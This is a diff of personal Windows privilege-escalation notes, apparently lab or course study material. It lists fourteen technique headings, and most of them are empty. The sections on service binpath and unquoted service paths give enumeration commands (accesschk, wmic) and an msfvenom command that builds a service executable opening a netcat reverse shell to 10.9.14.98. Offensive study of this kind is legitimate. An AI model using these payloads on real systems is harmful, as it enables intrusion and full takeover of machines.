@@ -13,7 +13,7 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
 
 
 1- Services (binpath):
-
+-----------------------------------------------------------------------
          First transfer the accesschk64.exe to system 
    
          Run accesschk64.exe -accepteula
@@ -34,7 +34,7 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
 
 
 2- Services (Unquoted path):
-
+---------------------------------------------------------------------------------------
           For it to work we need to identify which are the path which are not included in quotes
           
           wmic service get name,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
@@ -43,40 +43,40 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
 
           First transfer nc.exe to C:\Users\user directory
           
-          msfvenom -p windows/exec CMD="C:\Users\user\nc.exe 10.9.14.98 443 -e cmd.exe" -f exe-service 
+          msfvenom -p windows/exec CMD="C:\Users\user\nc.exe 10.9.14.98 443 -e cmd.exe" -f exe-service > common.exe
 
 3- Service (Registry):
-
+-------------------------------------------------------------------------------------------
 
 4- Services( Executable files):
-
+---------------------------------------------------------------------------------------------
 
 5- Registry (Always installed elevated):
-
+---------------------------------------------------------------------------------------------
 
 6- Registry (Modified autorun): Need to have admin login to work
-
+-------------------------------------------------------------------------------------------------
 
 7- Password minig (Registry):
-
+-------------------------------------------------------------------------------------------
 
 8- Password mining (Memory)
-
+-----------------------------------------------------------------------------------------
 
 9- Password mining (Configuration Files):
-
+------------------------------------------------------------------------------------------
 
 10- Scheduled tasks (Missing binary):
-
+------------------------------------------------------------------------------------------
 
 11- Startup applications:
-
+--------------------------------------------------------------------------------------------
 
 12- Potato attacks:
-
+--------------------------------------------------------------------------------------------
 
 13- DLL Hijacking:
-
+----------------------------------------------------------------------------------------------
 
 14-Kernel exploits:
-
+----------------------------------------------------------------------------------------------
